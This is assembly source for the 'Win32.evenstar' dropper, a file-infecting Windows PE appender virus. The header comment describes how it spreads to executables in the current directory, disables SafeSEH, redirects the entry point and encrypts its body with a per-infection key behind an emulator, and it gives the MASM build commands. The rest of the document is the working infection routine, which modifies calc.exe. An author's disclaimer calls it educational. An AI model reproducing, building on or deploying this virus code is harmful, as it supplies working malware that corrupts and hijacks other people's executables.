;:==============================================================================;
;:                                                                              ;
;:  Win32.evenstar dropper                                                      ;
;:                                                                              ;
;:==============================================================================;

comment $

Welcome to the win32.evenstar code, written by mos6581/EOF.

es.asm          dropper code
es_vm.asm       emulator
payload.asm     the payload that is injected into binaries. the "real" win32.evenstar code
es_enc.asm      encryption/decryption engine 

This virus is a basic last section PE appender. The main focus of this code
is to show an example of how emulation can obfuscate the virus body. For a 
more in-depth explanation, check out my article "Emulation: Transposition of 
Control (From Anti-Virus to Virus)."

Here is a brief rundown of win32.evenstar:

+ Infects all suitable PE files in the current directory.

+ Expands the last segment by 0x1000 and appends both the emulator
  and payload.

+ Removes Load Config Data table to disable SafeSEH

+ Changes OEP to the emulated code.

+ When it infects a new file, a new encryption key is generated.

+ es.exe will infect calc.exe only. 

+ Executing calc.exe will start the win32.evenstar virus, that will begin
  infecting.

+ Compile win32.evenstar 
  C:\masm32\bin\ml.exe /c /coff /Cp es.asm
  C:\masm32\bin\link.exe /SUBSYSTEM:WINDOWS /lIBPATH:C:\masm32\lib es.obj

  or...

  Just run rebuild.bat, which will copy calc_orig.exe to calc.exe and then
  run es.exe which will infect calc.exe (this is the viral code).



  Finally some lame disclaimer:  

All customers are advised to take all necessary steps to ensure that their 
computer has a active, working Anti-Virus Program . No responsibility can be 
accepted by Anal Communications for any loss or damage sustained as a 
consequence of any virus transmission . 

WE CANNOT GUARANTEE EMAIL OR SURFING THE WEB TO BE VIRUS FREE.

But seriously: I am completely against damaging personal property (unless it
is mine) and note that this virus was written with a weak spreader that will
not leave its home directory. So do me a favour and use this for research and
educational purposes only.

$

.686                                                                       
.model flat,stdcall                                                        
option casemap:none                                                        
assume fs:nothing 

include     C:\masm32\include\windows.inc                                  
include     C:\masm32\include\kernel32.inc  
includelib  C:\masm32\lib\kernel32.lib  


.data
fvirtualalloc           db "VirtualAlloc",0
fvirtualprotect         db "VirtualProtect",0
fcreatefile             db "CreateFileA",0
fgetfilesize            db "GetFileSize",0
freadfile               db "ReadFile",0
fclosehandle            db "CloseHandle",0
fwritefile              db "WriteFile",0
fgetcurrentdirectory    db "GetCurrentDirectoryA",0
ffindfirstfile          db "FindFirstFileA",0
ffindnextfile           db "FindNextFileA",0

.code

ES_STACK_SIZE   equ 128

;:==============================================================================;
;:  Local variables                                                             ;
;:==============================================================================;
es_code_base            equ     [ebp - 4]
es_k32_base             equ     [ebp - 8]
es_file_handle          equ     [ebp - 12]
es_file_size            equ     [ebp - 16]
es_file_buffer          equ     [ebp - 20]
es_junk                 equ     [ebp - 24]
es_vm_remote_entry      equ     [ebp - 28]

;:==============================================================================;
;:  Entry point                                                                 ;
;:==============================================================================;
start:
    nop
    call    delta
delta:
    pop     ebx
    push    ebp
    mov     ebp, esp
    sub     esp, ES_STACK_SIZE
    mov     es_code_base, ebx

;   Open target file
    
    push    NULL
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_ALWAYS
    push    NULL
    push    0
    push    GENERIC_READ
    push    OFFSET target_file
    call    CreateFile
    mov     es_file_handle, eax

;   Get target file size
    push    NULL
    push    eax
    call    GetFileSize
    mov     es_file_size, eax
    
;   Allocate memory
    push    PAGE_READWRITE
    push    MEM_COMMIT
    add     eax, 1000h
    push    eax
    push    NULL
    call    VirtualAlloc
    mov     es_file_buffer, eax

;   Read file into memory
    push    NULL
    lea     eax, es_junk
    push    eax
    push    es_file_size
    push    es_file_buffer
    push    es_file_handle
    call    ReadFile

;   Close file handle
    push    es_file_handle
    call    CloseHandle

;   Find PE header
    mov     ebx, es_file_buffer
    assume  ebx:ptr IMAGE_DOS_HEADER

;   Install signature
    mov     [ebx].e_oemid, 0eeeeh

;   PE
    mov     eax, [ebx].e_lfanew
    assume  ebx:nothing
    lea     ebx, [ebx + eax]                            ; PE Header in ebx

;   Expand SizeOfImage
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     eax, [ebx].OptionalHeader.SizeOfImage
    add     eax, 1000h
    mov     [ebx].OptionalHeader.SizeOfImage, eax
    pop     eax
    push    ebx
    

;   Get address of last section
    mov     eax, SIZEOF IMAGE_SECTION_HEADER
    xor     edx, edx
    mov     WORD PTR dx, [ebx].FileHeader.NumberOfSections
    dec     dl
    mul     edx
    push    ebx
    add     ebx, 0f8h
    lea     ebx, [ebx + eax]                            ; ebx = last section hdr absolute

;   Expand last section header
    assume  ebx:ptr IMAGE_SECTION_HEADER
    ;pop     edx                                         ; edx = ptr to PE hdr
    mov     eax, [ebx].SizeOfRawData
    add     eax, 1000h
    mov     [ebx].SizeOfRawData, eax
    mov     eax, [ebx].Characteristics
    or      eax, IMAGE_SCN_MEM_WRITE
    mov     [ebx].Characteristics, eax
    assume  ebx:nothing
    mov     DWORD PTR eax, [ebx + 08h]                  ; VirtualSize
    add     eax, 1000h
    mov     [ebx + 08h], eax

;   OEP
    pop     edx
    assume  edx:ptr IMAGE_NT_HEADERS
    mov     eax, (00016000h + 8A00h)
    mov     esi, [edx].OptionalHeader.AddressOfEntryPoint
    add     esi, [edx].OptionalHeader.ImageBase
    push    esi
    mov     [edx].OptionalHeader.AddressOfEntryPoint, eax
    assume  edx:nothing

;   Inject vm
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, [ebx].SizeOfRawData
    mov     edx, es_file_buffer
    lea     edi, [eax + edx]                            ; Raw address of end of section
    sub     edi, 1000h
    push    edi
    assume  ebx:nothing
    mov     esi, OFFSET vm_intro
    mov     ecx, (OFFSET vm_end - OFFSET vm_intro)
    mov     es_vm_remote_entry, edi
    rep     movsb
    pop     edx
    pop     esi
    mov     [edx + 7], esi

;   Analyze code
    mov     eax, (OFFSET payload_end - OFFSET payload)
    mov     ecx, eax
    stosd                                               ; Size of payload    
    xor     eax, eax
    stosd                                               ; How many instructions were counted
    xor     esi, esi                                    ; Instruction counter
    push    edi
    push    OFFSET payload
@es_analysis:
    call    mlde32
    pop     edx
    add     edx, eax
    stosb
    push    edx
    sub     ecx, eax
    inc     esi
    test    ecx, ecx
    jne     @es_analysis
    mov     eax, 0deadbeefh
    stosd
    mov     ecx, esi
    add     ecx, 7
    not     ecx
    lea     ebx, [edi + ecx]
    mov     [ebx], esi                                  ; Store instruction counter    

;   Inject payload
    push    edi
    mov     esi, OFFSET payload
    mov     ecx, (OFFSET payload_end - OFFSET payload)
    rep     movsb

;   Encrypt payload
    mov     esi, [esp + 8]
    pop     edi
    
    call    vm_enc

;   Stamp in key
    mov     edi, es_vm_remote_entry
    lea     edi, [edi + 1 + (OFFSET vm_dec_key - OFFSET vm_intro)]
    mov     eax, vm_key
    mov     [edi], eax

;   Open file for writing
    push    NULL
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    NULL
    push    0
    push    GENERIC_WRITE
    push    OFFSET target_file
    call    CreateFile
    mov     es_file_handle, eax

;   Commit changes to exe
    push    NULL
    lea     eax, es_junk
    push    eax
    mov     eax, es_file_size
    add     eax, 1000h
    push    eax
    push    es_file_buffer
    push    es_file_handle
    call    WriteFile

;   Close handle
    push    es_file_handle
    call    CloseHandle

    invoke  ExitProcess, 0

    ret

include mlde32.asm
include vm_enc.asm
include es_vm.asm
include payload.asm



target_file     db "calc.exe",0

end start